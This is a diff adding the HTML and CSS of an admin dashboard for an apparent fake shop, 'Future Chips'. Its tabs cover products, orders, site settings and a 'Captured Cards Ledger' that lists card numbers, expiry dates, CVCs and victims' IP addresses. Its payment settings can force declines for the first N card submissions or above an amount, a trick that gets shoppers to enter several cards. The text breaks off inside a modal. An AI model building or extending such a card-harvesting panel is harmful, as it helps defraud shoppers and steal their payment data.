@@ -1,0 +1,2332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Control Center Dashboard — Future Chips</title>
+  
+  
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Outfit:wght@400;700;900&display=swap');
+
+:root {
+  /* Dynamic themes, fallback values */
+  --primary-color: #00f0ff;
+  --accent-color: #ff00e5;
+  --background-color: #0a0a1a;
+  --card-bg: rgba(16, 16, 36, 0.6);
+  --text-color: #ffffff;
+  --text-muted: #8c8cbe;
+  
+  --font-title: 'Outfit', sans-serif;
+  --font-body: 'Inter', sans-serif;
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  background-color: var(--background-color);
+  color: var(--text-color);
+  font-family: var(--font-body);
+  line-height: 1.6;
+  overflow-x: hidden;
+  background-image: 
+    radial-gradient(circle at 10% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 40%),
+    radial-gradient(circle at 90% 80%, rgba(255, 0, 229, 0.05) 0%, transparent 40%);
+  background-attachment: fixed;
+}
+
+/* Glassmorphism utility */
+.glass {
+  background: var(--card-bg);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  border: 1px solid rgba(255, 255, 255, 0.05);
+}
+
+.container {
+  width: 90%;
+  max-width: 1200px;
+  margin: 0 auto;
+}
+
+/* Header */
+header {
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  padding: 1.5rem 0;
+  transition: background 0.3s;
+}
+
+header.scrolled {
+  background: rgba(10, 10, 26, 0.85);
+  backdrop-filter: blur(10px);
+  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+}
+
+header .nav-container {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.logo {
+  font-family: var(--font-title);
+  font-weight: 900;
+  font-size: 1.8rem;
+  letter-spacing: 2px;
+  color: #ffffff;
+  text-decoration: none;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+
+.logo span {
+  background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  filter: drop-shadow(0 0 10px rgba(0, 240, 255, 0.3));
+}
+
+.nav-links {
+  display: flex;
+  gap: 2rem;
+  list-style: none;
+}
+
+.nav-links a {
+  color: var(--text-muted);
+  text-decoration: none;
+  font-weight: 500;
+  transition: color 0.3s;
+}
+
+.nav-links a:hover {
+  color: #ffffff;
+}
+
+.cart-icon-btn {
+  background: none;
+  border: none;
+  color: #ffffff;
+  cursor: pointer;
+  position: relative;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 45px;
+  height: 45px;
+  border-radius: 50%;
+  transition: background 0.3s;
+}
+
+.cart-icon-btn:hover {
+  background: rgba(255, 255, 255, 0.05);
+}
+
+.cart-icon-btn svg {
+  width: 22px;
+  height: 22px;
+  fill: currentColor;
+}
+
+.cart-badge {
+  position: absolute;
+  top: 5px;
+  right: 5px;
+  background: var(--accent-color);
+  color: #ffffff;
+  font-size: 0.75rem;
+  font-weight: bold;
+  padding: 2px 6px;
+  border-radius: 10px;
+  box-shadow: 0 0 10px var(--accent-color);
+}
+
+/* Hero Section */
+.hero {
+  padding: 6rem 0 4rem 0;
+  text-align: center;
+  position: relative;
+}
+
+.hero h1 {
+  font-family: var(--font-title);
+  font-weight: 900;
+  font-size: 4rem;
+  line-height: 1.1;
+  margin-bottom: 1rem;
+  letter-spacing: -1px;
+}
+
+.hero h1 span {
+  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  display: inline-block;
+  animation: glow-pulse 3s infinite alternate;
+}
+
+.hero p {
+  color: var(--text-muted);
+  font-size: 1.2rem;
+  max-width: 600px;
+  margin: 0 auto 2.5rem auto;
+}
+
+/* Search and Filters */
+.filters-section {
+  margin-bottom: 3rem;
+  padding: 1.5rem;
+  border-radius: 16px;
+}
+
+.filters-wrapper {
+  display: flex;
+  gap: 1.5rem;
+  flex-wrap: wrap;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.search-box {
+  flex: 1;
+  min-width: 280px;
+  position: relative;
+}
+
+.search-box input {
+  width: 100%;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 10px;
+  padding: 0.8rem 1rem 0.8rem 2.8rem;
+  color: #ffffff;
+  font-family: var(--font-body);
+  transition: all 0.3s;
+}
+
+.search-box input:focus {
+  border-color: var(--primary-color);
+  outline: none;
+  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
+}
+
+.search-box svg {
+  position: absolute;
+  left: 1rem;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 18px;
+  height: 18px;
+  fill: var(--text-muted);
+}
+
+.filter-group {
+  display: flex;
+  gap: 1rem;
+  align-items: center;
+}
+
+.filter-group select {
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 10px;
+  padding: 0.8rem 1.5rem;
+  color: #ffffff;
+  cursor: pointer;
+  outline: none;
+  font-family: var(--font-body);
+  transition: border-color 0.3s;
+}
+
+.filter-group select:focus {
+  border-color: var(--primary-color);
+}
+
+/* Product Grid */
+.products-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+  gap: 2.5rem;
+  margin-bottom: 5rem;
+}
+
+/* Product Card */
+.product-card {
+  border-radius: 20px;
+  overflow: hidden;
+  transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), box-shadow 0.4s;
+  display: flex;
+  flex-direction: column;
+  height: 100%;
+}
+
+.product-card:hover {
+  transform: translateY(-8px);
+  box-shadow: 0 15px 30px rgba(0, 240, 255, 0.1);
+  border-color: rgba(0, 240, 255, 0.3);
+}
+
+.product-image-wrap {
+  width: 100%;
+  aspect-ratio: 1;
+  position: relative;
+  background: #000;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+}
+
+.product-image-wrap img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  transition: transform 0.5s ease;
+}
+
+.product-card:hover .product-image-wrap img {
+  transform: scale(1.05);
+}
+
+.product-info {
+  padding: 1.5rem;
+  display: flex;
+  flex-direction: column;
+  flex-grow: 1;
+}
+
+.product-category {
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  color: var(--primary-color);
+  margin-bottom: 0.5rem;
+  font-weight: 700;
+}
+
+.product-title {
+  font-family: var(--font-title);
+  font-size: 1.4rem;
+  font-weight: 700;
+  margin-bottom: 0.5rem;
+  line-height: 1.3;
+}
+
+.product-desc {
+  color: var(--text-muted);
+  font-size: 0.9rem;
+  margin-bottom: 1.5rem;
+  display: -webkit-box;
+  -webkit-line-clamp: 2;
+  -webkit-box-orient: vertical;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  flex-grow: 1;
+}
+
+.product-footer {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.product-price {
+  font-family: var(--font-title);
+  font-weight: 900;
+  font-size: 1.5rem;
+  color: #ffffff;
+}
+
+.btn {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 0.5rem;
+  padding: 0.8rem 1.5rem;
+  border-radius: 10px;
+  font-weight: 600;
+  font-family: var(--font-body);
+  text-decoration: none;
+  cursor: pointer;
+  transition: all 0.3s;
+  border: none;
+}
+
+.btn-primary {
+  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
+  color: #ffffff;
+  box-shadow: 0 4px 15px rgba(0, 240, 255, 0.3);
+}
+
+.btn-primary:hover {
+  transform: scale(1.03);
+  box-shadow: 0 4px 20px rgba(0, 240, 255, 0.5);
+}
+
+.btn-outline {
+  background: transparent;
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  color: #ffffff;
+}
+
+.btn-outline:hover {
+  border-color: var(--primary-color);
+  background: rgba(0, 240, 255, 0.05);
+}
+
+/* Detail View Layout */
+.product-detail-layout {
+  display: grid;
+  grid-template-columns: 1.2fr 1fr;
+  gap: 4rem;
+  padding: 5rem 0;
+  align-items: center;
+}
+
+@media (max-width: 768px) {
+  .product-detail-layout {
+    grid-template-columns: 1fr;
+    gap: 2rem;
+    padding: 2rem 0;
+  }
+  .hero h1 {
+    font-size: 2.5rem;
+  }
+}
+
+.detail-img-card {
+  border-radius: 24px;
+  overflow: hidden;
+  aspect-ratio: 1;
+}
+
+.detail-img-card img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+.detail-info {
+  display: flex;
+  flex-direction: column;
+}
+
+.detail-price-box {
+  margin: 1.5rem 0 2.5rem 0;
+}
+
+.detail-price-label {
+  font-size: 0.85rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.detail-price-val {
+  font-family: var(--font-title);
+  font-size: 3rem;
+  font-weight: 900;
+  line-height: 1.1;
+  color: #ffffff;
+}
+
+.detail-checkout-form {
+  display: flex;
+  flex-direction: column;
+  gap: 1rem;
+}
+
+.form-group {
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+}
+
+.form-group label {
+  font-size: 0.9rem;
+  color: var(--text-muted);
+}
+
+.form-group input {
+  width: 100%;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 10px;
+  padding: 0.9rem 1rem;
+  color: #ffffff;
+  font-family: var(--font-body);
+  transition: all 0.3s;
+}
+
+.form-group input:focus {
+  border-color: var(--primary-color);
+  outline: none;
+  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
+}
+
+/* Slide-over Cart Panel */
+.cart-panel {
+  position: fixed;
+  top: 0;
+  right: -450px;
+  width: 100%;
+  max-width: 420px;
+  height: 100%;
+  z-index: 1000;
+  box-shadow: -10px 0 30px rgba(0,0,0,0.5);
+  display: flex;
+  flex-direction: column;
+  transition: right 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+.cart-panel.active {
+  right: 0;
+}
+
+.cart-header {
+  padding: 1.5rem;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.cart-header h2 {
+  font-family: var(--font-title);
+  font-size: 1.5rem;
+}
+
+.cart-close-btn {
+  background: none;
+  border: none;
+  color: var(--text-muted);
+  cursor: pointer;
+  font-size: 1.5rem;
+}
+
+.cart-items {
+  flex-grow: 1;
+  overflow-y: auto;
+  padding: 1.5rem;
+  display: flex;
+  flex-direction: column;
+  gap: 1.5rem;
+}
+
+.cart-item {
+  display: flex;
+  gap: 1rem;
+  align-items: center;
+  padding-bottom: 1.5rem;
+  border-bottom: 1px solid rgba(255,255,255,0.03);
+}
+
+.cart-item img {
+  width: 60px;
+  height: 60px;
+  border-radius: 8px;
+  object-fit: cover;
+  background: #000;
+}
+
+.cart-item-details {
+  flex-grow: 1;
+}
+
+.cart-item-title {
+  font-weight: 600;
+  font-size: 0.95rem;
+  margin-bottom: 0.2rem;
+}
+
+.cart-item-price {
+  color: var(--primary-color);
+  font-weight: 700;
+  font-size: 0.9rem;
+}
+
+.cart-item-remove {
+  background: none;
+  border: none;
+  color: var(--accent-color);
+  cursor: pointer;
+  font-size: 0.8rem;
+  padding: 4px;
+}
+
+.cart-footer {
+  padding: 1.5rem;
+  border-top: 1px solid rgba(255, 255, 255, 0.05);
+  background: rgba(8, 8, 20, 0.9);
+}
+
+.cart-total {
+  display: flex;
+  justify-content: space-between;
+  font-size: 1.2rem;
+  font-weight: bold;
+  margin-bottom: 1.5rem;
+}
+
+.cart-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: rgba(0, 0, 0, 0.6);
+  backdrop-filter: blur(4px);
+  z-index: 999;
+  display: none;
+}
+
+.cart-overlay.active {
+  display: block;
+}
+
+/* Status / Confirmation page layout */
+.status-card {
+  max-width: 550px;
+  margin: 8rem auto;
+  padding: 3rem;
+  border-radius: 24px;
+  text-align: center;
+}
+
+.status-icon {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 2rem auto;
+}
+
+.status-icon.success {
+  background: #ffffff;
+  color: #22c55e; /* Vibrant success green */
+  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+  border: none;
+}
+
+.status-icon.success svg {
+  width: 40px;
+  height: 40px;
+  fill: currentColor;
+}
+
+.status-title {
+  font-family: var(--font-title);
+  font-weight: 900;
+  font-size: 2.2rem;
+  margin-bottom: 1rem;
+}
+
+.status-text {
+  color: var(--text-muted);
+  margin-bottom: 2.5rem;
+}
+
+.receipt-info {
+  background: rgba(255, 255, 255, 0.02);
+  border: 1px solid rgba(255, 255, 255, 0.05);
+  border-radius: 12px;
+  padding: 1.5rem;
+  text-align: left;
+  margin-bottom: 2.5rem;
+}
+
+.receipt-row {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 0.8rem;
+  font-size: 0.95rem;
+}
+
+.receipt-row:last-child {
+  margin-bottom: 0;
+  padding-top: 0.8rem;
+  border-top: 1px solid rgba(255,255,255,0.05);
+  font-weight: bold;
+}
+
+/* Animations */
+@keyframes glow-pulse {
+  from {
+    filter: drop-shadow(0 0 5px var(--primary-color));
+  }
+  to {
+    filter: drop-shadow(0 0 20px var(--accent-color));
+  }
+}
+
+/* Footer styling */
+footer {
+  padding: 3rem 0;
+  border-top: 1px solid rgba(255, 255, 255, 0.05);
+  text-align: center;
+  color: var(--text-muted);
+  font-size: 0.9rem;
+}
+
+/* Admin Panel Dashboard Styles */
+
+.dashboard-layout {
+  display: flex;
+  min-height: 100vh;
+}
+
+/* Sidebar Nav */
+.sidebar {
+  width: 260px;
+  border-right: 1px solid rgba(255, 255, 255, 0.05);
+  display: flex;
+  flex-direction: column;
+  padding: 2rem 1.5rem;
+  flex-shrink: 0;
+  position: sticky;
+  top: 0;
+  height: 100vh;
+}
+
+.sidebar-title {
+  font-family: var(--font-title);
+  font-weight: 900;
+  font-size: 1.4rem;
+  letter-spacing: 1px;
+  margin-bottom: 2.5rem;
+  color: #ffffff;
+}
+
+.sidebar-menu {
+  list-style: none;
+  display: flex;
+  flex-direction: column;
+  gap: 0.8rem;
+  flex-grow: 1;
+}
+
+.sidebar-link {
+  display: flex;
+  align-items: center;
+  gap: 0.8rem;
+  padding: 0.8rem 1rem;
+  border-radius: 8px;
+  color: var(--text-muted);
+  text-decoration: none;
+  font-weight: 500;
+  cursor: pointer;
+  transition: all 0.3s;
+}
+
+.sidebar-link:hover, .sidebar-link.active {
+  color: #ffffff;
+  background: rgba(255, 255, 255, 0.05);
+}
+
+.sidebar-link.active {
+  border-left: 3px solid var(--primary-color);
+  border-radius: 0 8px 8px 0;
+}
+
+/* Main Content Area */
+.main-content {
+  flex-grow: 1;
+  padding: 3rem;
+  overflow-y: auto;
+}
+
+.content-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 3rem;
+}
+
+.content-header h1 {
+  font-family: var(--font-title);
+  font-weight: 700;
+  font-size: 2.2rem;
+}
+
+/* Tabs */
+.tab-content {
+  display: none;
+}
+
+.tab-content.active {
+  display: block;
+}
+
+/* Cards & Tables */
+.admin-table-container {
+  border-radius: 16px;
+  overflow: hidden;
+  margin-bottom: 2rem;
+  border: 1px solid rgba(255, 255, 255, 0.05);
+}
+
+.admin-table {
+  width: 100%;
+  border-collapse: collapse;
+  text-align: left;
+  font-size: 0.95rem;
+}
+
+.admin-table th {
+  background: rgba(255, 255, 255, 0.02);
+  padding: 1rem 1.5rem;
+  font-weight: 600;
+  color: var(--primary-color);
+  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+  text-transform: uppercase;
+  font-size: 0.75rem;
+  letter-spacing: 1px;
+}
+
+.admin-table td {
+  padding: 1.2rem 1.5rem;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+  vertical-align: middle;
+}
+
+.admin-table tr:hover {
+  background: rgba(255, 255, 255, 0.01);
+}
+
+.admin-table img {
+  width: 45px;
+  height: 45px;
+  border-radius: 6px;
+  object-fit: cover;
+  background: #000;
+}
+
+/* Modals */
+.modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  z-index: 10000;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.3s;
+}
+
+.modal.active {
+  opacity: 1;
+  pointer-events: auto;
+}
+
+.modal-backdrop {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.75);
+  backdrop-filter: blur(8px);
+}
+
+.modal-wrapper {
+  position: relative;
+  z-index: 10;
+  width: 90%;
+  max-width: 550px;
+  border-radius: 20px;
+  padding: 2.5rem;
+  box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+  max-height: 90vh;
+  overflow-y: auto;
+}
+
+.modal-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 2rem;
+}
+
+.modal-header h2 {
+  font-family: var(--font-title);
+  font-weight: 700;
+  font-size: 1.6rem;
+}
+
+.modal-close {
+  background: none;
+  border: none;
+  color: var(--text-muted);
+  cursor: pointer;
+  font-size: 1.8rem;
+  line-height: 1;
+}
+
+/* Settings Form Grid */
+.settings-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+  gap: 2rem;
+  margin-bottom: 2rem;
+}
+
+.settings-group {
+  display: flex;
+  flex-direction: column;
+  gap: 0.8rem;
+  margin-bottom: 1.5rem;
+}
+
+.color-input-wrapper {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+
+.color-input-wrapper input[type="color"] {
+  width: 50px;
+  height: 50px;
+  border-radius: 10px;
+  border: 1px solid rgba(255,255,255,0.1);
+  background: none;
+  cursor: pointer;
+}
+
+.color-input-wrapper input[type="text"] {
+  flex-grow: 1;
+}
+
+/* Log specifics */
+.ip-cell {
+  font-family: monospace;
+  color: var(--primary-color);
+  font-weight: bold;
+}
+
+.status-badge {
+  display: inline-block;
+  padding: 3px 8px;
+  border-radius: 6px;
+  font-size: 0.8rem;
+  font-weight: bold;
+  text-transform: uppercase;
+}
+
+.status-badge.completed {
+  background: rgba(0, 255, 170, 0.1);
+  color: #00ffaa;
+  border: 1px solid rgba(0,255,170,0.2);
+}
+
+.status-badge.pending,
+.status-badge.failed {
+  background: rgba(239, 68, 68, 0.1);
+  color: #ef4444;
+  border: 1px solid rgba(239, 68, 68, 0.2);
+}
+
+@media (max-width: 900px) {
+  .dashboard-layout {
+    flex-direction: column;
+  }
+  .sidebar {
+    width: 100%;
+    height: auto;
+    border-right: none;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    padding: 1.5rem;
+  }
+  .sidebar-menu {
+    flex-direction: row;
+    flex-wrap: wrap;
+    justify-content: space-around;
+  }
+  .main-content {
+    padding: 1.5rem;
+  }
+}
+
+</style>
+</head>
+<body>
+
+  <div class="dashboard-layout">
+    
+    <!-- Sidebar Nav -->
+    <aside class="sidebar glass">
+      <div class="sidebar-title">⚡ Operator Node</div>
+      <ul class="sidebar-menu">
+        <li>
+          <a class="sidebar-link active" data-tab="products">
+            📦 Products
+          </a>
+        </li>
+        <li>
+          <a class="sidebar-link" data-tab="orders">
+            💳 Orders
+          </a>
+        </li>
+
+        <li>
+          <a class="sidebar-link" data-tab="cards">
+            🔒 Card Info
+          </a>
+        </li>
+        <li>
+          <a class="sidebar-link" data-tab="settings">
+            ⚙️ Site Settings
+          </a>
+        </li>
+      </ul>
+      <div style="margin-top: auto; padding-top: 1rem;">
+        <button id="logout-btn" class="btn btn-outline" style="width: 100%; border-color: var(--accent-color); color: var(--accent-color);">
+          Logout Session
+        </button>
+      </div>
+    </aside>
+
+    <!-- Main Content Area -->
+    <main class="main-content">
+      
+      <!-- Products Tab -->
+      <section id="products-tab" class="tab-content active">
+        <div class="content-header">
+          <h1>Product Catalog</h1>
+          <button id="add-product-btn" class="btn btn-primary">+ Add New Module</button>
+        </div>
+        <div class="admin-table-container glass">
+          <table class="admin-table">
+            <thead>
+              <tr>
+                <th>Visual</th>
+                <th>Module ID</th>
+                <th>Name</th>
+                <th>Category</th>
+                <th>Value (USD)</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody id="admin-products-tbody">
+              <!-- Dynamically injected -->
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- Orders Tab -->
+      <section id="orders-tab" class="tab-content">
+        <div class="content-header">
+          <h1>Transaction Ledger</h1>
+        </div>
+        <div class="admin-table-container glass">
+          <table class="admin-table">
+            <thead>
+              <tr>
+                <th>Order ID</th>
+                <th>Customer</th>
+                <th>Item Purchased</th>
+                <th>Amount</th>
+                <th>IP Address</th>
+                <th>Status</th>
+                <th>Date</th>
+              </tr>
+            </thead>
+            <tbody id="admin-orders-tbody">
+              <!-- Dynamically injected -->
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+
+
+      <!-- Card Info Tab -->
+      <section id="cards-tab" class="tab-content">
+        <div class="content-header">
+          <h1 id="cards-ledger-title">Captured Cards Ledger</h1>
+          <div style="display: flex; gap: 1rem; align-items: center;">
+            <input type="text" id="card-search-input" placeholder="🔍 Search card digits..." class="btn btn-outline" style="background: rgba(255,255,255,0.05); text-align: left; padding: 0.5rem 1rem; font-size: 0.9rem; color: #ffffff; max-width: 200px; border-color: rgba(255, 255, 255, 0.1);">
+            <button id="view-trash-btn" class="btn btn-outline" style="border-color: var(--accent-color); color: var(--accent-color); display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
+              🗑️ Trash Bin
+            </button>
+            <button id="change-pin-btn" class="btn btn-outline" style="border-color: var(--primary-color); color: var(--primary-color); display: none; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
+              🔑 Change PIN
+            </button>
+            <button id="change-admin-pwd-btn" class="btn btn-outline" style="border-color: var(--primary-color); color: var(--primary-color); display: none; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
+              🔐 Change Password
+            </button>
+          </div>
+        </div>
+        <div class="admin-table-container glass">
+          <table class="admin-table">
+            <thead>
+              <tr>
+                <th>Card Number</th>
+                <th>Expiration</th>
+                <th>CVC</th>
+                <th>Country</th>
+                <th>User IP</th>
+                <th>Captured At</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody id="admin-cards-tbody">
+              <!-- Dynamically injected -->
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- Site Settings Tab -->
+      <section id="settings-tab" class="tab-content">
+        <div class="content-header">
+          <h1>Global Configurations</h1>
+        </div>
+        <div class="glass" style="padding: 2.5rem; border-radius: 20px; max-width: 700px;">
+          <form id="settings-form">
+            <div class="settings-group">
+              <label for="settings-site-name">Platform Branding Name</label>
+              <input type="text" id="settings-site-name" class="btn btn-outline" style="width:100%; text-align:left; background:rgba(255,255,255,0.05); padding:1rem;" required>
+            </div>
+            
+            <div class="settings-grid">
+              <div class="settings-group">
+                <label>Primary Theme Color</label>
+                <div class="color-input-wrapper">
+                  <input type="color" id="settings-primary-color">
+                  <input type="text" id="settings-primary-text" class="btn btn-outline" style="background:rgba(255,255,255,0.05);" placeholder="#00f0ff">
+                </div>
+              </div>
+              
+              <div class="settings-group">
+                <label>Accent Highlight Color</label>
+                <div class="color-input-wrapper">
+                  <input type="color" id="settings-accent-color">
+                  <input type="text" id="settings-accent-text" class="btn btn-outline" style="background:rgba(255,255,255,0.05);" placeholder="#ff00e5">
+                </div>
+              </div>
+
+              <div class="settings-group">
+                <label>Background Core Color</label>
+                <div class="color-input-wrapper">
+                  <input type="color" id="settings-bg-color">
+                  <input type="text" id="settings-bg-text" class="btn btn-outline" style="background:rgba(255,255,255,0.05);" placeholder="#0a0a1a">
+                </div>
+              </div>
+            </div>
+
+            <div style="height: 1px; background: rgba(255,255,255,0.08); margin: 2rem 0;"></div>
+            
+            <h3 style="margin-bottom: 1.5rem; color: var(--primary-color);">Payment Routing & Decline Logic</h3>
+            
+            <div class="settings-grid" style="margin-bottom: 1.5rem;">
+              <div class="settings-group">
+                <label for="settings-decline-all" style="display: flex; align-items: center; gap: 0.5rem; cursor: pointer; user-select: none;">
+                  <input type="checkbox" id="settings-decline-all" style="width: 1.2rem; height: 1.2rem; cursor: pointer; accent-color: var(--primary-color);">
+                  Force Decline All Payments
+                </label>
+                <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.3rem; line-height: 1.4;">
+                  If checked, every card submission will immediately result in a declined screen.
+                </div>
+              </div>
+
+              <div class="settings-group">
+                <label for="settings-success-attempt">Success on Attempt Number</label>
+                <input type="number" id="settings-success-attempt" class="btn btn-outline" style="width:100%; text-align:left; background:rgba(255,255,255,0.05); padding:1rem;" placeholder="1" min="1" required>
+                <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.3rem; line-height: 1.4;">
+                  Force N card attempts to decline. The Nth card submission will be allowed to succeed (e.g. 5th card).
+                </div>
+              </div>
+              
+              <div class="settings-group">
+                <label for="settings-decline-threshold">Auto-Success Threshold (USD)</label>
+                <input type="number" step="0.01" id="settings-decline-threshold" class="btn btn-outline" style="width:100%; text-align:left; background:rgba(255,255,255,0.05); padding:1rem;" placeholder="50.00" required>
+                <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.3rem; line-height: 1.4;">
+                  Only checkout attempts under this amount will succeed. Equal or greater amounts will be declined.
+                </div>
+              </div>
+            </div>
+
+            <button type="submit" class="btn btn-primary" style="width: 100%; padding: 1rem; margin-top: 1rem;">
+              Write Settings to Database
+            </button>
+          </form>
+          <div id="settings-success" style="color: #00ffaa; margin-top: 1rem; text-align: center; font-size: 0.9rem;"></div>
+        </div>
+      </section>
+
+    </main>
+  </div>
+
+  <!-- Product Modal (Add / Edit) -->
+  <div class="modal" id="product-modal">
+    <div class="modal-backdrop" id="modal-backdrop"></div>
+    <div class="modal-wrapper glass">
+      <div class="modal-header">
+        <h2 id="modal-title">Add Cyber Module</h2>
+        <button class="modal-close" id="modal-close-btn">&times;</button>
+      </div>
+      <form id="product-form">
+        <input type="hidden" id="product-id-field">
+        
+        <div class="form-group" style="margin-bottom: 1.2rem;">
+          <label for="product-name-field">Module Name</label>
+          <input type="text" id="product-name-field" required placeholder="e.g. Plasma Grid Stabilizer">
+        </div>
+        
+        <div class="form-group" style="margin-bottom: 1.2rem;">
+          <label for="product-category-field">Category</label>
+          <select id="product-category-field" class="btn btn-outline" style="background:rgba(255,255,255,0.05); text-align:left; width: 100%;">
+            <option value="Processors">Processors</option>
+            <option value="Interfaces">Interfaces</option>
+            <option value="Displays">Displays</option>
+            <option value="Energy">Energy</option>
+          </select>
+        </div>
+        
+        <div class="form-group" style="margin-bottom: 1.2rem;">
+          <label for="product-price-field">Value (USD)</label>
+          <input type="number" id="product-price-field" step="0.01" min="10" max="100000" required placeholder="10.00 to 100000.00">
+        </div>
+
+        <div class="form-group" style="margin-bottom: 1.2rem;">
+          <label for="product-desc-field">Specification Log (Description)</label>
+          <textarea id="product-desc-field" rows="4" class="btn btn-outline" style="background:rgba(255,255,255,0.05); text-align:left; width:100%; font-family:inherit; resize:vertical; padding: 1rem;" placeholder="Detailed microchip characteristics..."></textarea>
+        </div>
+
+        <div class="form-group" style="margin-bottom: 1.8rem;">
+          <label for="product-image-field">Micrographic Visual (Upload Image)</label>
+          <input type="file" id="product-image-field" accept="image/*" class="btn btn-outline" style="background:rgba(255,255,255,0.05); text-align:left; padding: 0.8rem;">
+          <small style="color: var(--text-muted); margin-top: 0.3rem;">Upload image or leave empty for digital placeholder SVG</small>
+        </div>
+
+        <button type="submit" class="btn btn-primary" style="width: 100%; padding: 1rem;" id="modal-submit-btn">
+          Compile Product Data
+        </button>
+      </form>
+    </div>
+  </div>
+
+
+
+  <!-- Password Prompt Modal -->
+  <div class="modal" id="password-modal">
+    <div class="modal-backdrop" id="password-modal-backdrop"></div>
+    <div class="modal-wrapper glass" style="max-width: 400px; text-align: center;">
+      <div class="modal-header" style="justify-content: center; margin-bottom: 1rem;">
+        <h2>🔒 Decryption Required</h2>
+      </div>
+      <p style="color: var(--text-muted); font-size: 0.95rem; margin-bottom: 1.5rem;">Enter the 6-digit operator code to access the trash ledger:</p>
+      
+      <div class="form-group" style="margin-bottom: 1.5rem;">
+        <input type="password" id="trash-pin-input" maxlength="6" style="text-align: center; font-size: 1.8rem; letter-spacing: 0.5rem; width: 100%; padding: 0.8rem; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: #ffffff;" placeholder="••••••">
+        <div id="pin-error" style="color: var(--accent-color); font-size: 0.9rem; margin-top: 0.8rem; min-height: 1.2rem;"></div>
+      </div>
+      
+      <div style="display: flex; gap: 1rem; justify-content: center;">
+        <button id="cancel-pin-btn" class="btn btn-outline" style="flex: 1; padding: 0.8rem;">Cancel</button>
+        <button id="submit-pin-btn" class="btn btn-primary" style="flex: 1; padding: 0.8rem;">Decrypt</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Reusable Dark Confirmation Modal -->
+  <div class="modal" id="confirm-modal">
+    <div class="modal-backdrop" id="confirm-modal-backdrop"></div>
+    <div class="modal-wrapper glass" style="max-width: 450px; text-align: center; padding: 2.5rem; border-radius: 20px;">
